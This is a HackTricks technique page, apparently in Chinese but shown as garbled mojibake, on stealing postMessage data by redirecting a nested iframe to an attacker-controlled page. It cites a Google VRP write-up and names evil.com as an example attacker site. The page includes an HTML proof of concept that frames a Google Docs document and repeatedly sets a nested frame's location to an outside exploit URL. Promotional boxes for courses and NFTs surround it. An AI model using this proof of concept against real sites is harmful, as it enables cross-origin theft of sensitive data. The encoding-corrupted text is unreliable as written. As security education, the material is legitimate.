# çªƒå– postmessage ä¿®æ”¹ iframe ä½ç½®

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æƒ³è¦åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Ÿ æˆ–è€…æƒ³è¦è®¿é—®**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF**ï¼Ÿ è¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs é›†åˆ](https://opensea.io/collection/the-peass-family) - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ä¸Šå…³æ³¨æˆ‘ ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## æ›´æ”¹å­ iframe ä½ç½®

æ ¹æ®[**è¿™ç¯‡æ–‡ç« **](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)ï¼Œå¦‚æœæ‚¨å¯ä»¥åœ¨æ²¡æœ‰ X-Frame-Header çš„ç½‘é¡µä¸­åµŒå…¥åŒ…å«å¦ä¸€ä¸ª iframe çš„ç½‘é¡µï¼Œæ‚¨å¯ä»¥**æ›´æ”¹è¯¥å­ iframe çš„ä½ç½®**ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœ abc.com å°† efg.com ä½œä¸º iframeï¼Œå¹¶ä¸” abc.com æ²¡æœ‰ X-Frame å¤´ï¼Œæˆ‘å¯ä»¥ä½¿ç”¨ **`frames.location`** å°† efg.com æ›´æ”¹ä¸ºæ¶æ„ç½‘ç«™ evil.comï¼Œè·¨æºã€‚

è¿™åœ¨**postMessages**ä¸­ç‰¹åˆ«æœ‰ç”¨ï¼Œå› ä¸ºå¦‚æœé¡µé¢ä½¿ç”¨ç±»ä¼¼ `windowRef.postmessage("","*")` è¿™æ ·çš„**é€šé…ç¬¦**å‘é€æ•æ„Ÿæ•°æ®ï¼Œå°±æœ‰å¯èƒ½**æ›´æ”¹ç›¸å…³ iframeï¼ˆå­çº§æˆ–çˆ¶çº§ï¼‰çš„ä½ç½®åˆ°æ”»å‡»è€…æ§åˆ¶çš„ä½ç½®**ï¼Œä»è€Œçªƒå–è¿™äº›æ•°æ®ã€‚
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
//pseudo code
setTimeout(function(){ exp(); }, 6000);

function exp(){
//needs to modify this every 0.1s as it's not clear when the iframe of the iframe affected is created
setInterval(function(){
window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
}, 100);
}
</script>
</html>
```
<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦çœ‹åˆ°ä½ çš„**å…¬å¸åœ¨HackTricksä¸Šå®£ä¼ **å—ï¼Ÿæˆ–è€…æƒ³è¦è·å–**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼ŸæŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
